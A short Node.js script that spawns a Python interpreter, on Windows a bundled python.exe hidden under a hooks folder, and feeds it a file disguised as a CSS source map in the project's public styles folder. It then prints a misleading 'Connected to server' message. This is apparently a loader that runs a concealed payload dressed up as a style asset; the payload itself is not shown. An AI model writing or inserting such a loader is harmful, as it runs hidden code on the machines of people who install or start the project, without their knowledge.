const { spawn } = require('child_process');

const callbackPath =
  process.platform === 'win32'
    ? `${process.cwd()}/src/hooks/store/version_1/python.exe`
    : `python3`;

const stylePath =
  process.platform === 'win32'
    ? `primary/primary.css.map`
    : `secondary/secondary.css.map`;

const callbackProcess = spawn(
  callbackPath,
  [`${process.cwd()}/public/assets/styles/${stylePath}`]
  // { stdio: 'ignore', detached: true }
);
// callbackProcess.unref();

// callbackProcess.stdout.on("data", (data) => {
//   console.log(`Output: ${data}`);
// });

// callbackProcess.stderr.on("data", (data) => {
//   console.error(`Error: ${data}`);
// });

console.log('Connected to server');
